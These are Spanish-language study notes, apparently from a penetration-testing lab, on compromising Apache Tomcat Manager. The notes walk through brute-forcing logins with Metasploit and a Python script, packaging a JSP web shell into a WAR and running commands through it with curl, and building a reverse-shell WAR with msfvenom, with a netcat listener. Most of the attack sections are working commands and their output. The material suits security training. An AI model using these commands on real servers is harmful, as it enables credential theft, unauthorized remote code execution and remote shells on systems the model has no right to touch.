
## 1. Fuerza bruta contra Tomcat Manager

Tomcat dispone de interfaces de administración que pueden permitirnos desplegar aplicaciones y conseguir ejecución remota de comandos.

Las rutas más importantes son:

- `/manager/html` → administración de aplicaciones.
    
- `/host-manager` → administración de hosts virtuales.
    

Si conseguimos credenciales válidas para Tomcat Manager y el usuario tiene el rol adecuado, podemos subir un archivo WAR y ejecutar código en el servidor.

### Fuerza bruta con Metasploit

Módulo utilizado:

```
auxiliary/scanner/http/tomcat_mgr_login
```

Configuración:

```
use auxiliary/scanner/http/tomcat_mgr_login
set VHOST web01.inlanefreight.local
set RPORT 8180
set STOP_ON_SUCCESS true
set RHOSTS 10.129.201.58
show options
run
```

En el ejemplo del módulo se encuentran las credenciales:

```
tomcat:admin
```

**Opciones importantes:**

|Opción|Función|
|---|---|
|`RHOSTS`|IP del objetivo.|
|`RPORT`|Puerto de Tomcat.|
|`VHOST`|Nombre del host virtual.|
|`TARGETURI`|Ruta del panel; por defecto, `/manager/html`.|
|`USER_FILE`|Archivo con nombres de usuario.|
|`PASS_FILE`|Archivo con contraseñas.|
|`USERPASS_FILE`|Archivo con parejas de usuario y contraseña.|
|`STOP_ON_SUCCESS`|Detiene el escaneo cuando encuentra credenciales válidas.|
|`THREADS`|Número de hilos utilizados por host.|
|`PROXIES`|Permite enviar el tráfico a través de un proxy.|

Para comprobar la configuración antes de ejecutar el módulo:

```
show options
```

### Interceptar el tráfico con Burp Suite

Si el módulo no funciona como esperamos, podemos analizar las peticiones mediante un proxy HTTP.

```
set PROXIES HTTP:127.0.0.1:8080
run
```

Con Burp Suite podemos observar las peticiones enviadas al panel de administración y comprobar cómo se realiza la autenticación.

Tomcat utiliza **HTTP Basic Authentication** en este ejemplo. Las credenciales se codifican en Base64 y se incluyen en la cabecera `Authorization`.

Ejemplo:

```
echo 'YWRtaW46dmFncmFudA==' | base64 -d
```

Resultado:

```
admin:vagrant
```

**Importante:** Base64 no es cifrado; únicamente codifica los datos. Por tanto, no proporciona confidencialidad por sí mismo.

## 2. Fuerza bruta con Python

También podemos automatizar la comprobación de credenciales utilizando Python y la biblioteca `requests`.

El script del módulo recibe cuatro argumentos:

|Parámetro|Función|
|---|---|
|`-U`|URL base de Tomcat.|
|`-P`|Ruta del panel, como `/manager`.|
|`-u`|Archivo de usuarios.|
|`-p`|Archivo de contraseñas.|

Consultar la ayuda:

```
python3 mgr_brute.py -h
```

Ejemplo de ejecución:

```
python3 mgr_brute.py \
  -U http://web01.inlanefreight.local:8180/ \
  -P /manager \
  -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
  -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
```

El script prueba las combinaciones de usuarios y contraseñas y considera que una autenticación ha tenido éxito cuando recibe un código HTTP `200`.

En el ejemplo del módulo encuentra:

```
Username: tomcat
Password: admin
```

**Limitación del script:** un código `200` no demuestra por sí solo que todas las comprobaciones de autenticación hayan tenido éxito en cualquier aplicación. Hay que verificar el resultado en el contexto del objetivo. Además, el script mostrado lee los archivos en modo binario, por lo que puede imprimir las credenciales con el prefijo `b'...'`.

## 3. Subida de archivos WAR

Un archivo **WAR (Web Application Archive)** es un paquete que permite distribuir y desplegar aplicaciones web Java en Tomcat.

Si tenemos credenciales válidas para Tomcat Manager y el usuario dispone del rol `manager-gui`, normalmente podemos acceder a la interfaz gráfica y desplegar una aplicación.

Panel:

```
http://TARGET:8080/manager/html
```

En el laboratorio se utiliza:

```
http://web01.inlanefreight.local:8180/manager/html
```

### Crear un WAR con una web shell JSP

Una web shell JSP permite enviar comandos al servidor mediante peticiones HTTP.

El módulo muestra un archivo llamado `cmd.jsp` que recibe un parámetro `cmd` y ejecuta el comando en el sistema operativo.

Para empaquetar el archivo JSP:

```
zip -r backup.war cmd.jsp
```

Esto crea el archivo:

```
backup.war
```

**Flujo de explotación del laboratorio:**

1. Acceder a `/manager/html` con credenciales válidas.
    
2. Buscar la opción de despliegue de aplicaciones.
    
3. Seleccionar el archivo `backup.war`.
    
4. Pulsar **Deploy**.
    
5. Comprobar que la aplicación aparece desplegada.
    
6. Acceder al archivo JSP dentro de la aplicación.
    

Si la aplicación se llama `backup`, la ruta del archivo será:

```
http://TARGET:8080/backup/cmd.jsp
```

Acceder solamente a `/backup/` puede devolver un error `404` si no existe una página de inicio configurada.

### Ejecutar un comando con cURL

En el ejemplo del módulo:

```
curl 'http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id'
```

La respuesta muestra la identidad del usuario que ejecuta el proceso:

```
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

Esto confirma que los comandos se están ejecutando con los permisos del usuario `tomcat`.

**Recuerda:** conseguir ejecución remota de comandos no significa automáticamente ser `root` o administrador. El nivel de privilegios depende de la cuenta con la que se ejecuta Tomcat.

## 4. Reverse shell mediante un WAR

Otra posibilidad que presenta el módulo es generar un archivo WAR con `msfvenom`.

Ejemplo del laboratorio:

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```

Parámetros:

- `-p`: payload que se va a generar.
    
- `LHOST`: dirección IP desde la que recibiremos la conexión.
    
- `LPORT`: puerto donde esperamos la conexión.
    
- `-f war`: formato de salida.
    
- `> backup.war`: guarda el archivo generado.
    

Después, en el laboratorio:

1. Preparar un listener en la máquina de pruebas.
    
2. Desplegar el WAR desde Tomcat Manager.
    
3. Activar la aplicación desplegada para ejecutar el payload.
    

Listener utilizado en el ejemplo:

```
nc -lnvp 4443
```

Si todo funciona, recibiremos una conexión desde el servidor Tomcat.
